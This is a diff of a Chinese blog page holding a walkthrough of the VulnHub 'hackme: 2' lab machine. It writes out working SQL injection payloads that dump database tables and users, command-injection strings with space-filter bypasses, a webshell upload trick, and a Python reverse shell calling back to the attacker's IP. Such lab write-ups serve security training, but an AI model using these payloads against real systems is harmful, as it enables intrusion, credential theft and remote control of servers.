@@ -379,7 +379,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    832
+                    851
                 </div>
                 
 
@@ -405,40 +405,42 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p><strong>备注：</strong>文章是从自己csdn博客上移过来的，图片中可能存在水印的情况</p>
-<h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h1><p>靶机下载</p>
+<h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>靶机下载</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://vulnhub.com/entry/hackme-2,618/">hackme: 2 ~ VulnHub</a></p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">攻击机kali：192.168.12.144
 靶机：192.168.12.163<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h1 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h1><ol>
-<li>主机发现，发现主机<code>ip:192.168.12.163</code><pre class="line-numbers language-none"><code class="language-none">namp 192.168.12.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h3><p>2.1 主机发现，发现主机<code>ip:192.168.12.163</code></p>
+<pre class="line-numbers language-none"><code class="language-none">namp 192.168.12.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="/post/ed54/2-1.jpg" class>
-2.发现端口80，22端口开放；对80端口进行访问</li>
-</ol>
+<p>2.2 发现端口80，22端口开放；对80端口进行访问</p>
 <img src="/post/ed54/2-2.jpg" class>
 
-<p>3.对站点目录进行扫描</p>
+<p>2.3 对站点目录进行扫描</p>
 <pre class="line-numbers language-none"><code class="language-none">dirsearch -u &quot;http:&#x2F;&#x2F;192.168.12.163&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="/post/ed54/2-3.jpg" class>
 
 <img src="/post/ed54/2-4.jpg" class>
 
-<p>4.网站指纹识别</p>
+<ol start="2">
+<li>4网站指纹识别</li>
+</ol>
 <pre class="line-numbers language-none"><code class="language-none">whatweb http:&#x2F;&#x2F;192.168.12.163<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="/post/ed54/2-5.jpg" class>
-<h1 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3.漏洞挖掘"></a>3.漏洞挖掘</h1><p>1.通过注册登录进入</p>
+
+<h3 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3. 漏洞挖掘"></a>3. 漏洞挖掘</h3><p>3.1 通过注册登录进入</p>
 <img src="/post/ed54/3-1.jpg" class>
-<p>2.可能存在sql注入，用sqlmap失败，进行手工注入</p>
+<p>3.2 可能存在sql注入，用sqlmap失败，进行手工注入</p>
 <blockquote>
 <p>输入：<br>L   –&gt;返回信息			猜测这里存在模糊查询<br>Linux%’ and ‘123’ like ‘1   -&gt;成功返回信息</p>
 </blockquote>
-<p>3.构造payload进行注入，爆破数据库</p>
+<p>3.3 构造payload进行注入，爆破数据库</p>
 <pre class="line-numbers language-none"><code class="language-none">Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;database&#x2F;**&#x2F;(),&#39;2&#39;,&#39;3
 发现数据库：webapp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <img src="/post/ed54/3-2.jpg" class>
-<p>4.继续爆破表名，字段名，字段内的数据</p>
+<p>3.4 继续爆破表名，字段名，字段内的数据</p>
 <pre class="line-numbers language-none"><code class="language-none">表名：Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#39;webapp
 字段名：
 Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(column_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;users
@@ -447,27 +449,27 @@ Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(use
 <img src="/post/ed54/3-3.jpg" class>
 <img src="/post/ed54/3-4.jpg" class>
 <img src="/post/ed54/3-5.jpg" class>
-<p>5.根据上面获取的用户密码，利用前面md5破解网站破解密码</p>
+<p>3.5 根据上面获取的用户密码，利用前面md5破解网站破解密码</p>
 <blockquote>
 <p>用户：superadmin<br>密码：2386acb2cf356944177746fc92523983<br>破解：Uncrackable</p>
 </blockquote>
 <img src="/post/ed54/3-6.jpg" class>
-<p>6.利用破解的密码，进行登录</p>
+<p>3.6 利用破解的密码，进行登录</p>
 <img src="/post/ed54/3-7.jpg" class>
-<p>7.进行文件上传漏洞的尝试</p>
+<p>3.7 进行文件上传漏洞的尝试</p>
 <blockquote>
 <p>直接上传木马文件 —-》失败<br>修改后缀为jpg —&gt;访问失败–蚁剑连接不上<br>上传的jpg，利用bp进行修改后缀，上传显示成功，页面访问失败</p>
 </blockquote>
 <img src="/post/ed54/3-8.jpg" class>
-<p>8.尝试命令注入漏洞</p>
+<p>3.8 尝试命令注入漏洞</p>
 <img src="/post/ed54/3-9.jpg" class>
-<p>9.填写数据，利用bp抓包，修改数据</p>
+<p>3.9 填写数据，利用bp抓包，修改数据</p>
 <blockquote>
 <p>system(‘ls’)</p>
 </blockquote>
 <img src="/post/ed54/3-10.jpg" class>
 <img src="/post/ed54/3-11.jpg" class>
-<p>10.查看文件上传php文件</p>
+<p>3.10 查看文件上传php文件</p>
 <blockquote>
 <p>cat${IFS}welcomeadmin.php<br>文件上传的路径为：&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;</p>
 <img src="/post/ed54/3-12.jpg" class>
@@ -476,7 +478,7 @@ Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(use
 <blockquote>
 <p>&lt;  		 –&gt;   重定向，如cat&lt;flag.php<br>&lt;&gt;       –&gt;   重定向，如cat&lt;&gt;flag.php<br>%09 	 –&gt;   需要php环境，如cat%09flag.php<br>${IFS}	 –&gt;   单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS2}flag.php<br>$IFS$9 	 –&gt;   后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</p>
 </blockquote>
-<h1 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h1><p>1.结合命令执行漏洞和文件上传漏洞，将前面上传的inj.jpg转换成phin.php文件，再使用蚁剑进行连接</p>
+<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><p>4.1 结合命令执行漏洞和文件上传漏洞，将前面上传的inj.jpg转换成phin.php文件，再使用蚁剑进行连接</p>
 <blockquote>
 <p>system(‘mv${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;inj.jpg${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;phin.php’)</p>
 </blockquote>
@@ -484,16 +486,17 @@ Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(use
 <img src="/post/ed54/4-1.jpg" class>
 <p>蚁剑进行连接</p>
 <img src="/post/ed54/4-2.jpg" class>
-<p>2.利用脚本,通过蚁剑上传执行</p>
+<p>4.2 利用脚本,通过蚁剑上传执行</p>
 <blockquote>
 <p>import socket,subprocess,os<br>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((“192.168.12.144”,8989))<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;bash”,”-i”])</p>
 </blockquote>
-<p>3.kali开启监听</p>
+<p>4.3 kali开启监听</p>
 <blockquote>
 <p>nc -lvvp 8989</p>
 </blockquote>
 <img src="/post/ed54/4-3.jpg" class>
-<h1 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h1><p>1.在&#x2F;home&#x2F;legacy路径下发现二进制文件touchmenot，执行二进制文件</p>
+
+<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>5.1 在&#x2F;home&#x2F;legacy路径下发现二进制文件touchmenot，执行二进制文件</p>
 <img src="/post/ed54/5-1.jpg" class>
 
                 
@@ -601,10 +604,10 @@ Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(use
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/null" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
-                        <img src="/null" class="reward-img" alt="微信打赏二维码">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                     </div>
                 </div>
             </div>
